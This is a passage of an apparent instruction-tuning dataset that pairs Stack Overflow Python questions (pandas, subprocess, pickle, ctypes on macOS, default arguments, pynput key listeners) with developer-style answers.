filenames or filepaths of csv files.\n        path is str: (optional) filepath str filenames. os.curdir if None.\n        arg_list is [str]: (optional) list of pd.read_csv() arguments to pass.\n    Returns:\n        df_dict is {pd.DataFrame}: dict of dataframes created from csv files.'''\n    \n    df_dict = {}\n    \n    if path is None:\n        path = os.curdir\n        \n    if arg_list is None:\n        for fp in fp_list:\n            fp_var_name = fp.split('\/')[-1].split('.')[0]\n            df_dict[fp_var_name] = pd.read_csv(path + fp)\n    else:\n        args = ''\n        for arg in arg_list:\n            args += ', ' + arg\n        with open('script.py', 'w') as file:\n            file.write(&quot;&quot;&quot;\nimport pandas as pd\n\ndef csvs_to_df_dict():\n\\tdf_dict = {}\n&quot;&quot;&quot;)\n            for fp in fp_list:\n                fp_var_name = fp.split('\/')[-1].split('.')[0]\n                statement = &quot;\\tdf_dict['&quot; + fp_var_name + &quot;'] = pd.read_csv('&quot; + path + fp + &quot;'&quot; + args + &quot;)\\n&quot;\n                file.write(statement)\n            file.write('\\treturn df_dict')\n        import script\n        df_dict = script.csvs_to_df_dict()\n    \n    return df_dict\n<\/code><\/pre>\n<p>I then execute:<\/p>\n<pre><code>csv_path = os.curdir + '\/csv_tables\/'\nfilename_list = os.listdir(path=csv_path)\ndf_dict = read_files_in_folder(fp_list=filename_list, path=csv_path,\n                               arg_list=['index_col=0','skip_blank_lines=False'])\ndf_dict['abscorrup_idea.csv']\n<\/code><\/pre>\n<p>This writes script.py:<\/p>\n<pre><code>\nimport pandas as pd\n\ndef csvs_to_df_dict():\n    df_dict = {}\n    df_dict['abscorrup_idea'] = pd.read_csv('.\/csv_tables\/abscorrup_idea.csv', index_col=0, skip_blank_lines=False)\n# ... ... ...\n    df_dict['sorigeq_idea'] = pd.read_csv('.\/csv_tables\/sorigeq_idea.csv', index_col=0, skip_blank_lines=False)\n    return df_dict\n<\/code><\/pre>\n<p>But, it returns <code>NameError: name 'pd' is not defined<\/code> once it enters script.py from <code>df_dict = script.csvs_to_df_dict()<\/code>, after script.py's <code>import pandas as pd<\/code>. See below for full error output.<\/p>\n<p>It works if you don't pass arg_list and thus don't create a script.py file in the first place. So, it works for my immediate use, but I want to understand why it won't work the other way.<\/p>\n<p>I initially tried writing script.py as a series of statements and not a function. I assumed it would just run as if I had inserted that block of code into the code that calls it, but I was unable to call on <code>df_dict<\/code> from one script to the other. Different namespace? So, I'm trying a function.<\/p>\n<p>Here's the full error ouput:<\/p>\n<pre><code>---------------------------------------------------------------------------\nNameError                                 Traceback (most recent call last)\n&lt;ipython-input-26-13999e7ca3af&gt; in &lt;module&gt;\n----&gt; 1 df_dict = read_files_in_folder(fp_list=filename_list, path=csv_path,\n      2                                arg_list=['index_col=0','skip_blank_lines=False'])\n\n&lt;ipython-input-25-4f1e04e89145&gt; in read_files_in_folder(fp_list, path, arg_list)\n     35             file.write('\\treturn df_dict')\n     36         import script\n---&gt; 37         df_dict = script.csvs_to_df_dict()\n     38 \n     39     return df_dict\n\n~\\OneDrive\\Education\\WGU\\C749_intro_to_data_science\\Module_3_Investigate_A_Dataset\\Project\\script.py in csvs_to_df_dict()\n      1 \n      2 import pandas as pd\n----&gt; 3 \n      4 def csvs_to_df_dict():\n      5     df_dict = {}\n\nNameError: name 'pd' is not defined\n<\/code><\/pre>\n<p><strong>Original example before update, cleaned up and running properly:<\/strong><\/p>\n<p>For example:<\/p>\n<pre><code># script1.py #\nimport pandas as pd\n\n# The following is actually part of a function\n# that is called later in the same script1,\n# but I'm keeping it simple for the example.\n\ndf_dict = {}\n\nwith open('script2.py', 'w') as file:\n    file.write(&quot;&quot;&quot;\n# script2.py #\nimport pandas as pd\ndef run_it():\n\\tdf_dict = {}\n&quot;&quot;&quot;)\n    path = '.\/csv_tables\/'\n    fn = 'abscorrup_idea.csv'\n    file.write(&quot;\\tdf_dict['abscorrup_idea'] = pd.read_csv('&quot; + path + fn + &quot;', index_col=0, skip_blank_lines=False)\\n&quot;)\n    file.write('\\treturn df_dict')\n\nimport script2\ndf_dict = script2.run_it()\ndf_dict\n<\/code><\/pre>\n<p>This writes the following file, runs it, and calls the function:<\/p>\n<pre><code>\n# script2.py #\nimport pandas as pd\ndef run_it():\n    df_dict = {}\n    df_dict['abscorrup_idea'] = pd.read_csv('.\/csv_tables\/abscorrup_idea.csv', index_col=0, skip_blank_lines=False)\n    return df_dict\n<\/code><\/pre>","output_text":"<p>As seen in the update to the post, the following code works. Restarting the kernel seems to have done the trick. That or magic.<\/p>\n<pre><code>import os\nimport pandas as pd\n\ndef read_files_in_folder(fp_list, path=None, arg_list=None):\n    '''Reads a folder of csv tables into a dictionary of dataframes.\n    Does this dynamically by writing a script to a file, importing the script,\n    and running a function from the script.\n    Parameters:\n        fp_list is [str]: list of filenames or filepaths of csv files.\n        path is str: (optional) filepath str filenames. os.curdir if None.\n        arg_list is [str]: (optional) list of pd.read_csv() arguments to pass.\n    Returns:\n        df_dict is {pd.DataFrame}: dict of dataframes created from csv files.'''\n    \n    df_dict = {}\n    \n    if path is None:\n        path = os.curdir\n        \n    if arg_list is None:\n        for fp in fp_list:\n            fp_var_name = fp.split('\/')[-1].split('.')[0]\n            df_dict[fp_var_name] = pd.read_csv(path + fp)\n    else:\n        args = ''\n        for arg in arg_list:\n            args += ', ' + arg\n        with open('script.py', 'w') as file:\n            file.write(&quot;&quot;&quot;\nimport pandas as pd\n\ndef csvs_to_df_dict():\n\\tdf_dict = {}\n&quot;&quot;&quot;)\n            for fp in fp_list:\n                fp_var_name = fp.split('\/')[-1].split('.')[0]\n                statement = &quot;\\tdf_dict['&quot; + fp_var_name + &quot;'] = pd.read_csv('&quot; + path + fp + &quot;'&quot; + args + &quot;)\\n&quot;\n                file.write(statement)\n            file.write('\\treturn df_dict')\n        import script\n        df_dict = script.csvs_to_df_dict()\n    \n    return df_dict\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Check conditions to concat value in dataframe (Python)<p>Lets say I have a dataframe.<\/p>\n<div class=\"s-table-container\">\n<table class=\"s-table\">\n<thead>\n<tr>\n<th>ID<\/th>\n<th>B.<\/th>\n<th>C.<\/th>\n<th>D.<\/th>\n<th>E<\/th>\n<\/tr>\n<\/thead>\n<tbody>\n<tr>\n<td>1.<\/td>\n<td>b1_main<\/td>\n<td>null<\/td>\n<td>d_value<\/td>\n<td>e_value<\/td>\n<\/tr>\n<tr>\n<td>2.<\/td>\n<td>b2_main<\/td>\n<td>null<\/td>\n<td>null<\/td>\n<td>e_value<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<\/div>\n<p>The logic that I would want to apply concat value in B column to either value in C, D or E column. However, C will always take the first priority to concat with value in B column, if value in C column is null then it will only proceed to concat value in D column and proceed to E column if value in D column is also null.<\/p>\n<p><strong>Desired Output<\/strong><\/p>\n<div class=\"s-table-container\">\n<table class=\"s-table\">\n<thead>\n<tr>\n<th>ID<\/th>\n<th>B.<\/th>\n<th>C.<\/th>\n<th>D.<\/th>\n<th>E<\/th>\n<\/tr>\n<\/thead>\n<tbody>\n<tr>\n<td>1.<\/td>\n<td>b1_main, d_value<\/td>\n<td>null<\/td>\n<td>d_value<\/td>\n<td>e_value<\/td>\n<\/tr>\n<tr>\n<td>2.<\/td>\n<td>b2_main, e_value<\/td>\n<td>null<\/td>\n<td>null<\/td>\n<td>e_value<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n<\/div>\n<p>The code that i tried is below however it will concat all the values in C,D and E and remove null value.<\/p>\n<pre><code>df['B'] = pb6_branded[['B','C', 'D', 'E']].apply(lambda x: ','.join(x.dropna()), axis=1)\n<\/code><\/pre>\n<p>Thank you.<\/p>","output_text":"<p>Use back filling missing values by columns <code>'C', 'D', 'E'<\/code> and select first column (here <code>C<\/code>) and add to <code>B<\/code> column:<\/p>\n<pre><code>df = df.replace('null', np.nan)\ndf['B'] = df['B'] + ', ' + df[['C', 'D', 'E']].bfill(axis=1).iloc[:, 0]\n#selecting by colum name\n#df['B'] = df['B'] + ', ' + df[['C', 'D', 'E']].bfill(axis=1)['C']\nprint (df)\n    ID                 B   C        D        E\n0  1.0  b1_main, d_value NaN  d_value  e_value\n1  2.0  b2_main, e_value NaN      NaN  e_value\n<\/code><\/pre>\n<p>If possible all <code>C, D, E<\/code> filled by empty values, is possible use <a href=\"http:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.Series.str.cat.html\" rel=\"nofollow noreferrer\"><code>Series.str.cat<\/code><\/a>:<\/p>\n<pre><code>df = df.replace('null', np.nan)\ns = df[['C', 'D', 'E']].bfill(axis=1)['C']\ndf['B'] = df['B'].str.cat(s, na_rep='', sep=', ').str.strip(' ,')\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n `cdll.LoadLibrary(\"my.so\")` throws \"no suitable image found.\" but architectures match, and both for 64 bit. Why?<p>I have a &quot;shared object&quot; file <code>my.so<\/code> that I tried to load in python:<\/p>\n<pre><code>from ctypes import cdll\nlib = cdll.LoadLibrary(&quot;my.so&quot;)\n<\/code><\/pre>\n<p>This fails with<\/p>\n<pre><code>OSError: dlopen(my.so, 6): no suitable image found.  Did find:\nmy.so: unknown file type, first eight bytes: 0x7F 0x45 0x4C 0x46 0x02 0x01 0x01 0x00\n\/path\/to\/...\/my.so: unknown file type, first eight bytes: 0x7F 0x45 0x4C 0x46 0x02 0x01 0x01 0x00`\n<\/code><\/pre>\n<p>Reseach into other SO questions reveals:<\/p>\n<p><a href=\"https:\/\/stackoverflow.com\/questions\/3481508\/python-ctypes-not-loading-dynamic-library-on-mac-os-x\">Python ctypes not loading dynamic library on Mac OS X<\/a><\/p>\n<p>This user shares the &quot;No suitable image.&quot; error. The reason for them was a mismatch between the architecture of the processor running python (x86_64) and the target architecture of their .so file (ARM). The way to confirm this issue is to run, from the command line:<\/p>\n<pre><code>&gt;file my.so\n<\/code><\/pre>\n<p>This outputs <code>ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=..., stripped<\/code><\/p>\n<p>The focus of <a href=\"https:\/\/stackoverflow.com\/questions\/39477023\/error-mach-o-but-wrong-architecture-after-installing-anaconda-on-mac?rq=1\">Error &quot;mach-o, but wrong architecture&quot; after installing anaconda on mac<\/a> was 32-bit vs 64-bit. From python I can see that <code>import platform;platform.architecture()<\/code> gives <code>('64bit', '')<\/code>.<\/p>\n<p>From a response I now can't find it was stated that this technique can be unreliable and instead to use max int size. <code>import sys; sys.maxsixe<\/code> gives 9223372036854775807 which means 64-bit.<\/p>\n<p>Finally, in <a href=\"https:\/\/obrunet.github.io\/pythonic%20ideas\/compilation_cython\/\" rel=\"nofollow noreferrer\">a blog post on ELF binaries<\/a> the author gives the Python snippet <code>import os; os.uname()[4]<\/code> to give the machine architecture. For me this returns <code>x86_64<\/code>.<\/p>\n<hr \/>\n<p>To sum up, <code>cdll<\/code> doesn't recognise the ELF (&quot;unknown filetype&quot;). The environment and binary are both 64 bit. The architectures also both match (and are x86_64).<\/p>\n<p>Why is this not working as expected?<\/p>\n<p>edit (credit to Max):\nOS running python is macOS 10.15.7 Catalina.<\/p>","output_text":"<p>MacOS doesn\u2019t use the ELF shared object format, so it can\u2019t be loaded by the MacOS dynamic linker.  As it is based on the Mach microkernel, it continues to use the <a href=\"https:\/\/en.wikipedia.org\/wiki\/Mach-O\" rel=\"nofollow noreferrer\">Mach-O<\/a> binary format, and its shared libraries generally use the file extension <code>.dylib<\/code>.<\/p>\n<p>In general, even if the architectures match and they both use ELF, you can\u2019t use executable binaries\/shared objects across different Operating Systems.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n python unpack into multiple optional variables<p>In Perl, I can do<\/p>\n<pre><code>($x1, $x2, $x3, $x4) = (1, 2)\n<\/code><\/pre>\n<p>Then $x1 and $x2 are 1; $x3 and $x4 are 'undef'<\/p>\n<p>Does Python has something similar to this<\/p>\n<pre><code>(x1, x2, x3, x4) = [1,2]\n<\/code><\/pre>\n<p>so that x1 and x2 are 1; x3 and x4 are None?<\/p>\n<p>I tried above, Python gives me error:<\/p>\n<pre><code>not enough values to unpack (expected 4, got 2)\n<\/code><\/pre>\n<p>I tried to use * operator for optional unpacking<\/p>\n<pre><code>(x1, x2, *x3, *x4) = [1,2]\n<\/code><\/pre>\n<p>but * can only be used once.<\/p>\n<p>Thank you for your advice.<\/p>\n<p>Background: the List (array) on the right hand side can be any length between 1 and 4. I use [1,2] just for example.<\/p>","output_text":"<p>You could add a few <code>None<\/code>s and sweep any excess ones under the carpet (using the brush symbol <code>*<\/code> and the carpet symbol <code>_<\/code> :-):<\/p>\n<pre><code>x1, x2, x3, x4, *_ = lst + [None] * 4\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to create dictionary from three different list in Python using two same Keys and different values?<p>I have three lists:<\/p>\n<p>List containing keys is:<\/p>\n<pre><code>keys = ['testname', 'output']\n<\/code><\/pre>\n<p>List containing Values are:<\/p>\n<pre><code>value1 = ['pizza', 'dog', 'lion']\nvalue2 = ['12.3', '356', '45.6']\n<\/code><\/pre>\n<p>My desired output is:<\/p>\n<pre><code>{\n &quot;Labresult&quot;:[\n    { 'testname': 'pizza',\n       'output': '12.3',\n    },\n    \n    { 'testname': 'dog',\n      'output': '356,'\n    },\n    { 'testname': 'lion',\n       'output': '45.6',\n    }]\n }\n<\/code><\/pre>\n<p>What I tried:<\/p>\n<pre><code>dict(zip(key, zip(value1,value2)))\n<\/code><\/pre>","output_text":"<p>Good start, but you still need a loop over the values:<\/p>\n<pre><code>{&quot;Labresult&quot;: [dict(zip(keys, pair)) \n               for pair in zip(value1, value2)]}\n<\/code><\/pre>\n<p><i>Addendum<\/i>:<\/p>\n<p>In principle you can also switch to a Pandas based approach, e.g. if <code>value1<\/code> and <code>value2<\/code> are columns of a DataFrame. However, for larger amounts of data the limiting factor for your problem will always be the fact that you need to generate the nested dicts. Comparing the initially suggested approach with a potential pandas approach for larger amounts of data (no for-loop), it turns out that the former is much faster:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import numpy as np\nimport pandas as pd\nkeys = ['testname', 'output']\n\nvalue1 = list(np.random.choice(['pizza', 'dog', 'lion'], 100_000))\nvalue2 = list(map(str, np.round(np.random.random(100_000) * 1000, 1)))\n\n%timeit {&quot;Labresult&quot;: [dict(zip(keys, pair)) for pair in zip(value1, value2)]}\n# 56 ms \u00b1 1.8 ms per loop (mean \u00b1 std. dev. of 7 runs, 10 loops each)\n\ndf = pd.DataFrame({&quot;testname&quot;: value1, &quot;output&quot;: value2})\n%timeit {&quot;Labresult&quot;: df.apply(dict, axis=1).tolist()}\n# 1.1 s \u00b1 50.1 ms per loop (mean \u00b1 std. dev. of 7 runs, 1 loop each)\n<\/code><\/pre>\n<p>If you have the option to change the shape\/data type of your desired outcome (e.g. no nested dicts), that could allow for improvements.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python2 And Python3<p>This is for Python 2: <\/p>\n\n<pre><code>import re\n\nprint sum([int(i) for i in re.findall('[0-9]+',open(raw_input('What is the file you want to analyze?\\n'),'r').read())])\n<\/code><\/pre>\n\n<p>But why do I get a syntax error with Python 3?<\/p>\n\n<p>Python3<\/p>\n\n<pre><code>import re\n\nprint sum([int(i) for i in re.findall('[0-9]+',open(input('What is the file you want to analyze?\\n')).read())])\n<\/code><\/pre>","output_text":"<p>That is because in Python3 you should use brackets around the argument for the print function.<\/p>\n\n<p>print()<\/p>\n\n<p>so your code will work as soon as you write<\/p>\n\n<p>print(sum([int(i) for i in re.findall('[0-9]+',open(input('What is the file you want to analyze?\\n')).read())]))<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n subprocess.Popen['vim'] in an interactive Python session yields interesting results<p>Enter python shell<\/p>\n<p>then type<\/p>\n<pre><code>import subprocess\nsubprocess.Popen(&quot;vim&quot;)\n<\/code><\/pre>\n<p>Then the vim window opens. Try to quit vim using :q and then try typing in the interactive session.<\/p>\n<p>It seems like vim does not really actually quit. It seems as if I was in vim and in the Python shell at the same time.<\/p>\n<p>Why does this happen?<\/p>\n<p>I know that I can avoid this by running subprocess.call or Popen.communicate() etc., I am just curious as to what exactly is happening.<\/p>\n<p>It seems as if quitting vim using :q after running it in Popen still kind of keeps it running.<\/p>\n<p><img src=\"https:\/\/i.stack.imgur.com\/Tl7Nt.png\" alt=\"Image of the mess generated after Popening vim and quitting\" \/><\/p>","output_text":"<p>From the documentation of <code>Popen<\/code>:<\/p>\n<blockquote>\n<p>With the default settings of <code>None<\/code>, the child\u2019s file handles will be inherited from the parent.<\/p>\n<\/blockquote>\n<p>So both <code>python<\/code> and <code>vim<\/code> are reading from the same file <em>at the same time<\/em>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python subprocess performance for multiple pipelined commands<p>I was writing a python code using subprocess module and I got stuck in this situation where I need to use pipes to pass a result of a commnad to another to obtain specific data I need.<\/p>\n<p>However, this also can be achieved through pure Python code.<\/p>\n<p>Ex)<\/p>\n<pre><code>from subprocess import Popen\ncmd_result = Popen('ls -l .\/ | awk -F &quot; &quot; \\'{if ($5 &gt; 10000) print $0}\\'' | grep $USER', shell=True).communicate().split('\\n')\n<\/code><\/pre>\n<p>Or<\/p>\n<pre><code>cmd_result = Popen('ls -l .\/', shell=True).communicate().split('\\n')\nresult_lst = []\nfor result in cmd_result:\n    result_items = result.split()\n    if int(result_item[4]) &gt; 10000 and result_item[2] == &quot;user_name&quot;:\n        result_lst.append(result)\n\n       \n<\/code><\/pre>\n<p>And I am wondering which method is better than the other in efficiency-wise.\nI found that the one with pure python code is slower than the one with pipelines, but not sure if that means using pipes is more efficient.<\/p>\n<p>Thank you in advance.<\/p>","output_text":"<p>The absolutely best solution to this is to avoid using a subprocess at all.<\/p>\n<pre><code>import os\n\nmyuid = os.getuid()\n\nfor file in os.scandir(&quot;.&quot;):\n    st = os.stat(file)\n    if st.st_size &gt; 10000 and st.st_uid == myuid:\n        print(file)\n<\/code><\/pre>\n<p>In general, if you want to run and capture the output of a command, the simplest by far is <code>subprocess.check_output<\/code>; but really, <a href=\"https:\/\/mywiki.wooledge.org\/ParsingLs\" rel=\"nofollow noreferrer\">don't parse <code>ls<\/code> output<\/a>, and, of course, try to avoid superfluous subprocesses like <a href=\"https:\/\/www.iki.fi\/era\/unix\/award.html#grep\" rel=\"nofollow noreferrer\">useless <code>grep<\/code>s<\/a> if efficiency is important.<\/p>\n<pre><code>files = subprocess.check_output(\n    &quot;&quot;&quot;ls -l . | awk -v me=&quot;$USER&quot; '$5 &gt; 10000 &amp;&amp; $2 == me { print $9 }'&quot;&quot;&quot;,\n    text=True, shell=True)\n<\/code><\/pre>\n<p>This has several other problems; <code>$4<\/code> could contain spaces (it does, on my system) and <code>$9<\/code> could contain just the beginning of the file name if it contains spaces.<\/p>\n<p>If you need to run a process which could produce a lot of output concurrently and fetch its output as it arrives, not when the process has finished, the <a href=\"\/tags\/subprocess\/info\">Stack Overflow <code>subprocess<\/code> tag info page<\/a> has a couple of links to questions about how to do that; I am guessing it is not worth the effort for this simple task you are asking about, though it could be useful for more complex ones.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Divide entire dataframe by 2 using Python<p>I wish to divide my entire dataframe by 2 in Python<\/p>\n<p><strong>Data<\/strong><\/p>\n<pre><code>id      date    aa  bb  cc  dd\nstaff   Q1 23   6   2   6   0\nstaff2  Q2 23   6   2   6   0\n<\/code><\/pre>\n<p><strong>Desired<\/strong><\/p>\n<pre><code>id      date    aa  bb  cc  dd\nstaff   Q1 23   3   1   3   0\nstaff2  Q2 23   3   1   3   0\n<\/code><\/pre>\n<p><strong>Doing<\/strong><\/p>\n<pre><code>df.div(2)\n<\/code><\/pre>\n<p>Any suggestion is appreciated<\/p>\n<p>Receiving TypeError - update<\/p>\n<p><em>Wish to divide numerical columns by 2<\/em><\/p>","output_text":"<p>First we need select the number<\/p>\n<pre><code>df.update(df.select_dtypes(np.number)\/2)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python - What is the use of * operator on lists<p>I just came over a python program asking for output. The code was :<\/p>\n<pre><code>l=[]*100\nfor i in range (100):\nl.append(i+1)\nflag=0\nk=108\nfor i in range(100):\nif(k==l[i]):\n    print(&quot;Element is present at position&quot;,i)\n    flag=1\n    break\nif(flag==0):\nprint(&quot;Element is not present in the given list&quot;)\n<\/code><\/pre>\n<p>My question is what does the list l=[]*100 do?<\/p>\n<p>Besides when I am executing this code the answer I get is : &quot;Element is not present in the given list&quot;. But the answer given is 100 which I think is not possible.\nSomeone please help<\/p>","output_text":"<p>It would have been way quicker for you to start up a Python session and try it.  <code>[]*100<\/code> does nothing at all.  The <code>*100<\/code> is totally useless.  If you say <code>[0]*100<\/code>, then you get a list with 100 zeros, but 100 times an empty list is still an empty list.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python \/ Tkinter : Random number in function<p>I want to get a random number (in &quot;boucle&quot;) all the time i press the button, but when i do it, it gives me the same number<\/p>\n<pre><code>def boucledef(boucle=random.randint(0,10)):\n    global copienom, listprob\n    if boucle&gt;0:\n        nom=selectRandom(listprob)\n        while copienom == nom:\n            nom=selectRandom(listprob)\n        copienom=nom\n        global myLabel\n            \n        if boucle &gt;1:\n            delete_label()\n            myLabel = Label(root, text=nom, font=(&quot;Arial&quot;,20), bg = couleur_bg, fg = &quot;#2C2E75&quot;)\n            myLabel.pack(pady=10)\n        \n        if boucle ==1:\n            delete_label()\n            myLabel = Label(root, text=nom+&quot; is choosen&quot;, font=(&quot;Arial&quot;,20), bg = couleur_bg, fg = &quot;#2C2E75&quot;)\n            myLabel.pack(pady=10)\n            DeleteButton[&quot;state&quot;]=NORMAL\n            file_menu.entryconfig(&quot;New&quot;, state=&quot;normal&quot;)\n            listprob=[]\n        root.after(1000,boucledef, boucle-1)\n<\/code><\/pre>","output_text":"<p>Default parameter in python ... Once set, this arg has a memory space, so it wont need to call <code>random.randint(0,10)<\/code> the other times ...<\/p>\n<p>Here's a workaround :<\/p>\n<pre><code>def boucledef(boucle=None):\n    global copienom, listprob\n    if boucle == None :\n        boucle = random.randint(0,10)\n    if boucle&gt;0:\n    ...\n<\/code><\/pre>\n<p>For more information, python default argument are evaluated when the function is created, not when you call it. If you want to have a closer look, <a href=\"https:\/\/stackoverflow.com\/questions\/1132941\/least-astonishment-and-the-mutable-default-argument\">this thread<\/a> can help you.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python Pickle file gets erased without error<p>I have 3 pickle files to which add data separately through 3 variables <code>recipeNames = []<\/code>, <code>ingredients = {}<\/code>, <code>procedure = {}<\/code>, given below is the way I check if the file exists and load the data. Whenever I rn my program the 3 variables are empty when they are printed after loading.<\/p>\n<pre><code>recipeNames = []\ningredients = {}\nprocedure = {}\n# --------------------------------------\n\nif path.exists('RecipeNames.pickle'):\n    with open(&quot;RecipeNames.pickle&quot;, &quot;rb&quot;) as r:\n        recipeNames = pickle.load(r)\n        print(recipeNames)\n\nif not path.exists('RecipeNames.pickle'):\n    with open(&quot;RecipeNames.pickle&quot;, &quot;wb&quot;) as r:\n        recipeNames = []\n        pickle.dump(recipeNames, r)\n\n# ---------------------------------------\n\nif path.exists('Ingredients.pickle'):\n    with open(&quot;Ingredients.pickle&quot;, &quot;rb&quot;) as i:\n        ingredients = pickle.load(i)\n        print(ingredients)\n\nif not path.exists(&quot;Ingredients.pickle&quot;):\n    with open(&quot;Ingredients.pickle&quot;, &quot;wb&quot;) as i:\n        pickle.dump(ingredients, i)\n\n# ---------------------------------------\n\nif path.exists('Procedure.pickle'):\n    with open(&quot;Procedure.pickle&quot;, &quot;rb&quot;) as p:\n        procedure = pickle.load(p)\n        print(procedure)\n\nif not path.exists(&quot;Procedure.pickle&quot;):\n    with open(&quot;Procedure.pickle&quot;, &quot;wb&quot;) as p:\n        pickle.dump(procedure, p)\n<\/code><\/pre>\n<p>I have a function that I use to save the data whenever required, it is given below.<\/p>\n<pre><code>def save():\n    with open(&quot;RecipeNames.pickle&quot;, &quot;ab&quot;) as r:\n        pickle.dump(recipeNames, r)\n    with open(&quot;Ingredients.pickle&quot;, &quot;ab&quot;) as i:\n        pickle.dump(ingredients, i)\n    with open(&quot;Procedure.pickle&quot;, &quot;ab&quot;) as p:\n        pickle.dump(procedure, p)\n<\/code><\/pre>","output_text":"<p>The issue is that you are writing a pickle file for empty objects, but you save new data using append. So, when you load the pickle file, it loads the first pickle dump which happens to be empty data saved earlier, disregarding the fact that the same file contains more pickle dumps ahead.<\/p>\n<p>In short, just using 'wb' instead of 'ab' in your <code>save<\/code> function should solve your problem if I am correct.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python - Manual instantiation required no matter what?<p>I thought I could do this:<\/p>\n\n<pre><code>from mymodule import MyClass\nimport asyncio\n\nawait asyncio.gather(MyClass.myfunc1(),\n                         MyClass.myfunc2(),\n                         MyClass.myfunc3()\n                         )\n<\/code><\/pre>\n\n<p>which produces the error: <code>missing 1 required positional argument: 'self'<\/code><\/p>\n\n<p>So I fixed it by:<\/p>\n\n<pre><code>class1 = MyClass()\nclass2 = MyClass()\nclass3 = MyClass()\nawait asyncio.gather(class1.myfunc1(),\n                     class2.myfunc2(),\n                     class3.myfunc3()\n                     )\n<\/code><\/pre>\n\n<p>This seems to work fine but I have seen other modules that allow calling it by ClassName.method() without first instantiating. Or maybe it was just accessing some property. I'm not sure. Am I doing the right thing or is there a different way?<\/p>","output_text":"<p><code>self<\/code> means the created object or instance(Class1,Class2 and Class3) of class <code>MyClass<\/code>. So while calling methods of <code>MyClass<\/code> you need to pass the object as parameter.\nYo can do this in two ways.\n1. By using object as parameter<\/p>\n\n<p><code>Myclass.myfunc(Class1)<\/code> <\/p>\n\n<ol start=\"2\">\n<li>By creating instance first.<\/li>\n<\/ol>\n\n<pre><code>Class1.myfunc()\n<\/code><\/pre>\n\n<p>The second one is best way. Here you dont need to pass parameter because Class1 is automatically used as first parameter which is self. <\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why does this code not work when i change the functions names?<p>I saw this code on a website, it's use was to monitor the keyboard for any key getting pressed and then it would print the statements which are written below.\nthe thing is, whenever I change the functions names, it just... stops working!<\/p>\n<p>Basically when I change the <code>on_press<\/code> and <code>on_release<\/code> to things like <code>key_pressed<\/code> and <code>key_released<\/code> and then change the <code>on_press<\/code> and <code>on_release<\/code> in the button lines (in the listener variable) to the names I defined , the code runs without any error , but whenever I press any key on the keyboard , it just writes the assigned character and not the whole statement. Why?<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def on_press(key):\n    try:\n        print('alphanumeric key {0} pressed'.format(key.char))\n    except AttributeError:\n        print('special key {0} pressed'.format(key))\n\ndef on_release(key):\n    print('{0} released'.format(key))\n    if key == keyboard.Key.esc:\n        return False\n\nlistener = keyboard.Listener(\n    on_press=on_press,\n    on_release=on_release)\nlistener.start()\n<\/code><\/pre>","output_text":"<p>If I understand you correctly, you are trying to do this:<\/p>\n<pre><code>listener = keyboard.Listener(\n   key_pressed=key_pressed,\n   key_released=key_released)\n<\/code><\/pre>\n<p>The above will not work, you cannot change the keywords (&quot;keyword=value&quot;) on the Listener-function.<\/p>\n<p>The code below should work:<\/p>\n<pre><code>listener = keyboard.Listener(\n   on_press=key_pressed,\n   on_release=key_released)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Regex to match all strings from multiple lists<p>I'm using regex to match all strings from list.<\/p>\n\n<pre><code>import re\n\nbrand_list = ['scurfa', 'seagull', 'seagull', 'seiko']\n\nregular_expression = rf\"({'|'.join(brand_list)}) ([^\\s]+)\"\n\ndescription = \"\"\"\nVINTAGE KING SEIKO 44-9990 Gold Medallion,Manual Winding with mod caseback.Serviced 2019.\nPower reserve function at 12; push-pull crown at 4\nSeiko NE57 auto movement with power reserve\nMultilayered dial with SuperLuminova BG-W9\nTesting for a ScURFA 42342\n\"\"\"\n\nprint([\" \".join(t) for t in re.findall(regular_expression, soup_content.find('blockquote', { \"class\": \"postcontent restore\" }).text, re.IGNORECASE)])\n<\/code><\/pre>\n\n<p>I got these <\/p>\n\n<pre><code>['SEIKO 44-9990', 'Seiko NE57', 'ScURFA 42342']\n<\/code><\/pre>\n\n<p>But I want to replace <code>([^\\s]+)<\/code> with this <code>({'|'.join(model_list)})<\/code> based on this list<\/p>\n\n<pre><code>model_list = ['44-9990 Gold Medallion', 'NE57 auto', '42342 ']\n<\/code><\/pre>\n\n<p>So I can get output more like this<\/p>\n\n<pre><code>['SEIKO 44-9990 Gold Medallion', 'Seiko 